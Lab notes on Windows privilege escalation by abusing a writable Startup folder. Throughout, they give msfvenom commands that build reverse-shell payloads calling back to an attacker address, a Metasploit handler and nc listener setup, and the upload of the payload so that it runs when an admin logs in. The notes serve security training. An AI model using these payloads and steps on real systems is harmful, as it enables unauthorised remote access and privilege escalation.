(checklist)

- port scan
- version scan
- service scan

COMMANDS:
Startup Applications:

Generate the payload:
msfvenom -a x64 --platform windows -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.121.131 LPORT=4445 -f exe -o start_app_payload.exe

Let the target run the payload:
sudo python3 -m http.server 8080

Spin up metasploit:
msfconsole
use exploit/multi/handler
 - set payload windows/x64/meterpreter/reverse_tcp
 - set LHOST=192.168.121.131
 - set LPORT=4445
run

Wait for the reverse connection after the target execute the payload:

Connected:
meterpreter> getuid
shell (to become windows shell)

Find the vulnerability for startup programs located on:
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs

To check the permission of this folder:
icacls.exe startup
 - startup BUILTIN\Users:(OI)(CI)(F) - full access for user

Exit from shell:
exit

Let the listener run on the background:
background
 - sessions -i <session#> (go back to the session)
 - sessions -k <session#> (kill sessions)

Escalate Privilege by first creating a new payload and listener which is unstaged/shell (not meterpreter):
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.121.131 LPORT=4445 -f exe -o su_shell_payload.exe

Go back to the meterpreter session:
meterpreter > cd "C:\ProgramData\Microsoft\Windows\StartMenu\Programs\Startup"
 - Startup folder is where we have full access as user
 - We can upload a file from our kali to it

Upload the shell payload:
meterpreter > upload -f /home/kali/file1.exe su_shell_payload.exe
 - dir

Setup listener:
nc -nlvp 4445

In Gavin, logoff from the current user. Log back in as admin
 - Simulate when an admin login to their machine

Go back to the terminal

Conclusion:
In this lab, we are able to get the Admin privilege by leveraging the weak permission in StartupApplications. By default,all binaries in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup” folders are executed by a Windows hostautomatically. Since we have a write permission to the Startupfolder, we just droppedour reverse shell payload and waited for an admin to login to get an Admin-level privilege.



